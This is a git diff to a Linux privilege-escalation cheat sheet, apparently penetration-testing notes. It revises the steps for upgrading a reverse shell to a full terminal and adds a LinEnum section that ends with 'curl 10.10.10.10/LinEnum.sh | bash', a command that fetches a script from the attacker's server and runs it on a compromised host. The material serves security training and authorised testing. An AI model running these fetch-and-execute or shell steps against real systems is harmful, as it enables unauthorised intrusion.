@@ -6,15 +6,20 @@ Fix the Shell:
 python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
 
-# In Kali
+# In Kali Note the number of rows and cols in the current terminal window
+$ stty -a  
+
+# Next we will enable raw echo so we can use TAB autocompletes 
 $ stty raw -echo
 $ fg
 
 # In reverse shell
+$ stty rows <num> columns <cols>
+   
+# Finally
 $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
-$ stty rows <num> columns <cols>
 ```
 
 ## Start with the basics
@@ -220,6 +225,29 @@ KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 
 Great list here:
 https://github.com/lucyoa/kernel-exploits
 
+## Automated Linux Enumeration Scripts
+It is always a great idea to automate the enumeration process once you understand what you are looking for.
+
+### LinEmum.sh
+LinEnum is a handy method of automating Linux enumeration.  It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.
+
+First we need to git a copy to our local Kali linux machine:
+```
+git clone https://github.com/rebootuser/LinEnum.git
+```
+Next we can serve it up in the python simple web server:
+```
+root@kali:~test# cd LinEnum/
+root@kali:~test/LinEnum# ls
+root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:
+```
+www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash
+```
+And the enumeration script should run on the remote machine.
+
 ## References
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   
@@ -235,5 +263,7 @@ http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nf
 https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt 
 https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/  
 https://digi.ninja/blog/when_all_you_can_do_is_read.php  
-https://gtfobins.github.io/  
 https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2  
+https://gtfobins.github.io/  
+https://github.com/rebootuser/LinEnum
+
